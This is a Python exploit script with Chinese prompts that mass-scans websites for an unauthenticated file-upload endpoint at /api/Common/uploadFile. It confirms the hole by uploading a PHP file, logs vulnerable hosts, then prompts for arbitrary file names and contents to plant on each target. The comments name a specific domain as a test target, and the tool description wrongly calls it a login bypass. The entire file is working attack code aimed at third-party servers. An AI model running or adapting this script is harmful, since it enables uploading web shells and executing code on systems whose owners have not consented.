import argparse,requests,json
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
# 测试https://shouantang.com.cn
def banner():
    test = """
                                               ______
______________________________________________ ___  /
___  __ \  _ \_  ___/_  ___/  __ \_  __ \  __ `/_  / 
__  /_/ /  __/  /   _(__  )/ /_/ /  / / / /_/ /_  /  
_  .___/\___//_/    /____/ \____//_/ /_/\__,_/ /_/   
/_/                                                  
                                   author:NaA100
                                   date:2024-09-3
                                   version:1.0                    
"""
    print(test)

def poc(target):
    payload = '/api/Common/uploadFile'
    headers = {
        "User-Agent": "Mozilla/5.0(Macintosh;IntelMacOSX10_15_7)AppleWebKit/537.36(KHTML,likeGecko)Chrome/127.0.0.0Safari/537.36",
        "Content-Type": "multipart/form-data;boundary=----WebKitFormBoundaryj7OlOPiiukkdktZR",
        "Content-Length": "176",
    }
    data = '------WebKitFormBoundaryj7OlOPiiukkdktZR\r\nContent-Disposition: form-data; name=\"file\";filename=\"1.php\"\r\n\r\n<?php echo"hello world";?>\r\n------WebKitFormBoundaryj7OlOPiiukkdktZR--'
    proxie = {
        "http": "http://127.0.0.1:7890",
        "https": "http://127.0.0.1:7890",
    }

    try:
        res1 = requests.post(url=target+payload,verify=False,proxies=proxie,data=data,headers=headers,timeout=5)
        # print(res1.text)
        if res1.status_code == 200 and 'upload success' in res1.text:
            with open('result.txt','a',encoding='utf-8') as f:
                f.write(f'{target}\n')
            print(f"[+]该{target}存在文件上传")
            exp(target)
        else:
            print(f"[-]该{target}不存在文件上传")

    except Exception as e:
        print(e)


def exp(target):
    payload = '/api/Common/uploadFile'
    headers = {
        "User-Agent": "Mozilla/5.0(Macintosh;IntelMacOSX10_15_7)AppleWebKit/537.36(KHTML,likeGecko)Chrome/127.0.0.0Safari/537.36",
        "Content-Type": "multipart/form-data;boundary=----WebKitFormBoundaryj7OlOPiiukkdktZR",
        "Content-Length": "176",
    }
    proxie = {
        "http": "http://127.0.0.1:7890",
        "https": "http://127.0.0.1:7890",
    }
    filename = input('文件名（需添加后缀名）：')
    code = input('文件内容')
    data = '------WebKitFormBoundaryj7OlOPiiukkdktZR\r\nContent-Disposition: form-data; name=\"file\";filename=\"'+f'{filename}'+'\"\r\n\r\n'+f'{code}'+'\r\n------WebKitFormBoundaryj7OlOPiiukkdktZR--'
    res1 = requests.post(url=target + payload, verify=False, proxies=proxie, data=data, headers=headers, timeout=5)
    # print(res1.text)
    if res1.status_code == 200 and 'upload success' in res1.text:
        json_start = res1.text.find('{')
        if json_start != -1:
            json_str = res1.text[json_start:]
            data = json.loads(json_str)
            url = data['data']['url']
            url1 = url.replace('\\', '')
        print(f"{filename}上传成功，请访问路径{url1}")
    else:
        print(f"[-]该{target}不存在文件上传")


def main():

    banner()
    url_list = []
    parse = argparse.ArgumentParser(description="汉得SRM tomcat.jsp 登陆绕过漏洞")

    parse.add_argument("-u","--url",dest="url",type=str,help="Please enter url")
    parse.add_argument("-f","--file",dest="file",type=str,help="Please enter file")

    args = parse.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        with open(args.file,'r',encoding='utf-8') as f:
            for url in f.readlines():
                url = url.strip()
                url_list.append(url.replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"您的输入有误，请使用python file_name.py -h for help")

if __name__ == '__main__':
    main()